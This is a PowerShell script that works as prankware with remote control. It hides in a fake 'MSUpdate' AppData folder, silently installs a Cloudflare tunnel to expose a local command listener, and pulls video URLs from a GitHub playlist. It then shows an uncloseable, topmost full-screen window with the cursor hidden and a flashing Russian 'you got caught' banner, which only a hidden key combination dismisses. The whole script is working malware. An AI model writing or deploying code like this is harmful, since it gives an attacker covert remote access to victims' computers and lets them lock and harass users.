$github       = "NodeNode30-30"
$repo         = "system-libs"
$branch       = "main"
$playlist     = "playlist.txt"

$workDir      = "$env:USERPROFILE\AppData\Local\Microsoft\MSUpdate"
$cfPath       = "$workDir\cloudflared.exe"
$listenerPort = 1337
$playedFile   = "$workDir\played.txt"
$flagFile     = "$workDir\play.flag"
$stopFile     = "$workDir\stop.now"
$pidFile      = "$workDir\player.pid"

if (-not (Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force | Out-Null }

$PID | Set-Content $pidFile -Force

function Get-GitHubFile($path) {
    $url = "https://raw.githubusercontent.com/$github/$repo/$branch/$path"
    return (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
}

if (-not (Test-Path $cfPath)) {
    $url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
    Invoke-WebRequest -Uri $url -OutFile $cfPath -UseBasicParsing
}

$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $cfPath
$psi.Arguments = "tunnel --url http://localhost:$listenerPort --logfile $workDir\tunnel.log"
$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$psi.CreateNoWindow = $true
[System.Diagnostics.Process]::Start($psi) | Out-Null

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://localhost:$listenerPort/")
$listener.Start()

function Send-Response($ctx, $msg) {
    $buffer = [System.Text.Encoding]::UTF8.GetBytes($msg)
    $ctx.Response.ContentLength64 = $buffer.Length
    $ctx.Response.OutputStream.Write($buffer, 0, $buffer.Length)
    $ctx.Response.Close()
}

function Stop-All {
    if (Test-Path $flagFile) { [System.IO.File]::WriteAllText($flagFile, "0") }
    Get-Job -Name "VideoEnforcer" -ErrorAction SilentlyContinue | Stop-Job -ErrorAction SilentlyContinue
    Get-Job -Name "VideoEnforcer" -ErrorAction SilentlyContinue | Remove-Job -Force -ErrorAction SilentlyContinue
    Get-Process -Name "powershell","pwsh" -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -eq "WpfPlayer" } | Stop-Process -Force
    if (Test-Path "$workDir\video.mp4") { Remove-Item "$workDir\video.mp4" -Force -ErrorAction SilentlyContinue }
}

while ($listener.IsListening) {
    $ctx = $listener.GetContext()
    $path = $ctx.Request.Url.AbsolutePath

    switch ($path) {
        "/play" {
            try {
                Stop-All
                Start-Sleep -Seconds 1

                $content = Get-GitHubFile $playlist
                $urls = $content -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
                $played = @()
                if (Test-Path $playedFile) { $played = Get-Content $playedFile }
                
                $next = $urls | Where-Object { $_ -notin $played } | Select-Object -First 1
                if ($next) {
                    $outFile = "$workDir\video.mp4"
                    Invoke-WebRequest -Uri $next -OutFile $outFile -UseBasicParsing
                    
                    [System.IO.File]::WriteAllText($flagFile, "1")
                    
                    Start-Job -Name "VideoEnforcer" -ScriptBlock {
                        param($videoPath, $stopPath)
                        
                        $code = {
                            param($vFile, $sFile)
                            $ErrorActionPreference = 'SilentlyContinue'
                            Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase

                            $win = New-Object System.Windows.Window
                            $win.Title = "WpfPlayer"
                            $win.WindowState = 'Maximized'
                            $win.WindowStyle = 'None'
                            $win.ResizeMode = 'NoResize'
                            $win.Topmost = $true
                            $win.ShowInTaskbar = $false
                            $win.Background = [System.Windows.Media.Brushes]::Black
                            $win.Cursor = [System.Windows.Input.Cursors]::None

                            $win.Add_Closing({ if (-not $script:allowClose) { $_.Cancel = $true } })

                            $me = New-Object System.Windows.Controls.MediaElement
                            $me.Source = New-Object System.Uri($vFile)
                            $me.LoadedBehavior = 'Play'
                            $me.Add_MediaEnded({ $me.Position = [TimeSpan]::Zero; $me.Play() })

                            $banner = New-Object System.Windows.Controls.TextBlock
                            $banner.Text = "ПОЗДРАВЛЯЮ, ТЫ ПОПАЛСЯ :D"
                            $banner.FontSize = 48
                            $banner.FontWeight = 'Bold'
                            $banner.Foreground = [System.Windows.Media.Brushes]::Red
                            $banner.HorizontalAlignment = 'Center'
                            $banner.VerticalAlignment = 'Bottom'
                            $banner.Margin = '0,0,0,80'

                            $grid = New-Object System.Windows.Controls.Grid
                            $grid.Children.Add($me) | Out-Null
                            $grid.Children.Add($banner) | Out-Null
                            $win.Content = $grid

                            $timer = New-Object System.Windows.Threading.DispatcherTimer
                            $timer.Interval = [TimeSpan]::FromMilliseconds(400)
                            $timer.Add_Tick({ $banner.Opacity = 1 - $banner.Opacity })
                            $timer.Start()

                            $win.Add_PreviewKeyDown({
                                param($s, $e)
                                if ($e.Key -eq 'Q' -and [System.Windows.Input.Keyboard]::Modifiers -band 3) {
                                    $script:allowClose = $true
                                    New-Item $sFile -ItemType File -Force | Out-Null
                                    $win.Close()
                                }
                            })

                            $app = New-Object System.Windows.Application
                            $app.Run($win)
                        }

                        $powershell = [powershell]::Create()
                        $powershell.AddScript($code).AddArgument($videoPath).AddArgument($stopPath) | Out-Null
                        $powershell.Runspace.ApartmentState = "STA"
                        $powershell.Invoke()
                    } -ArgumentList $outFile, $stopFile | Out-Null
                    
                    Add-Content $playedFile $next
                    Send-Response $ctx "Playing in WPF full-screen: $next"
                } else {
                    Send-Response $ctx "All videos played"
                }
            } catch {
                Send-Response $ctx "Error: $_"
            }
        }
        "/next" {
            Stop-All
            $ctx.Response.Redirect("/play")
            $ctx.Response.Close()
        }
        "/stop" {
            Stop-All
            Send-Response $ctx "Stopped"
        }
        "/tunnel" {
            if (Test-Path "$workDir\tunnel.log") {
                $url = (Select-String -Path "$workDir\tunnel.log" -Pattern "https://.*\.trycloudflare\.com" | Select-Object -First 1).Matches.Value
                Send-Response $ctx ($url -or "Tunnel logging started but URL not found yet")
            } else {
                Send-Response $ctx "Log file not found"
            }
        }
        "/exit" {
            Stop-All
            Send-Response $ctx "Bye"
            [System.Environment]::Exit(0)
        }
        default {
            Send-Response $ctx "Commands: /play, /next, /stop, /tunnel, /exit"
        }
    }
}
